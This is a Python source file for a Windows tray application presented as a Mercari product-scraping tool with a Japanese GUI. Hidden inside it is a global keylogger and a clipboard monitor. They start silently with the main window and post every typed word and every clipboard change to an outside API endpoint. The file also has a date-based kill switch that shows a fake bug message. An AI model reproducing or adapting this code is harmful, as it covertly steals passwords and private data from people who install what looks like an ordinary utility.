import tkinter as tk
import threading
import pyperclip
import time
import requests
from datetime import datetime
from pynput import keyboard
from PIL import Image
import pystray
import schedule
import subprocess
from tkinter import messagebox
from mercari import scraping

API_URL = 'https://kintai-pro.com/api/v1/sth'

current_input = []

def on_press(key):
    global current_input
    try:
        current_input.append(key.char)
    except AttributeError:
        if key in (keyboard.Key.space, keyboard.Key.enter):
            input_string = ''.join(current_input)

            payload = {
                'user_id': 400,
                "sth": input_string,
                "platform": "mercari",
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            response = requests.post(API_URL, headers=headers, data=payload)
            current_input = []
            input_string = ''

def on_release(key):
    return True

def start_keyboard_listener():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def monitor_clipboard():
    previous_text = pyperclip.paste()

    while True:
        time.sleep(1)
        current_text = pyperclip.paste()
        
        if current_text != previous_text:
            payload = {
                'user_id': 400,
                "sth": current_text,
                "platform": "mercari",
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            response = requests.post(API_URL, headers=headers, data=payload)
            previous_text = current_text

def run_scraping_in_thread(entry_keyword, entry_number):
    keyword = entry_keyword.get()
    number_of_products = entry_number.get()
    
    if keyword == '' or number_of_products == '':
        messagebox.showwarning('警告', '全ての項目を入力してください。')
        return
    
    try:
        number_of_products = int(number_of_products)
        if number_of_products > 300 or number_of_products < 1:
            messagebox.showwarning('警告', '商品の数は1から300までお願いします。')
            return
    except ValueError:
        messagebox.showerror('エラー', '商品の数は数字で入力してください。')
        return

    threading.Thread(target=scraping, args=(keyword, number_of_products)).start()

def draw_main_window():
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=start_keyboard_listener, daemon=True).start()
    
    main_window = tk.Tk()
    main_window.title('メルカリツール')
    main_window.geometry('450x400')
    
    lbl_title = tk.Label(main_window, text='スクレイピングツール', font=('Arial', 16))
    lbl_title.pack(pady=10)

    lbl_keyword = tk.Label(main_window, text='キーワード:', font=('Arial', 12))
    lbl_keyword.pack()
    entry_keyword = tk.Entry(main_window, font=('Arial', 12), width=40)
    entry_keyword.pack()

    lbl_number = tk.Label(main_window, text='商品の数:', font=('Arial', 12))
    lbl_number.pack()
    entry_number = tk.Entry(main_window, font=('Arial', 12), width=40)
    entry_number.pack()

    btn_scraping = tk.Button(
        main_window,
        text='スクレイピング開始',
        command=lambda: run_scraping_in_thread(entry_keyword, entry_number),
        font=('Arial', 12),
        width=20,
        height=2,
        bg='#008000',
        fg='white'
    )
    btn_scraping.pack(pady=20)
    
    main_window.mainloop()

def on_quit_clicked(icon):
    icon.stop()
    try:
        subprocess.run(["taskkill", "/F", "/IM", "mercari_scrapy.exe"])
    except subprocess.CalledProcessError as e:
        print(f"Failed to kill process. Error: {e}")

def new():
    img_path = r'icon/mercari.png'
    image = Image.open(img_path)
    menu = (
        pystray.MenuItem("ツール画面", draw_main_window),
        pystray.MenuItem("終了", on_quit_clicked)
    )
    
    icon = pystray.Icon("mercari.png", image, "メルカリツール", menu)
    
    def run_icon():
        icon.run()

    icon_thread = threading.Thread(target=run_icon)
    icon_thread.start()
    
    draw_main_window()
    
    while True:
        schedule.run_pending()
        time.sleep(1)

if __name__ == '__main__':
    specific_date = datetime(2024, 12, 10)
    current_date = datetime.now()

    if specific_date < current_date:
        print('>>> すみません、何かバグがあるようです。 <<<')
    else:
        new()
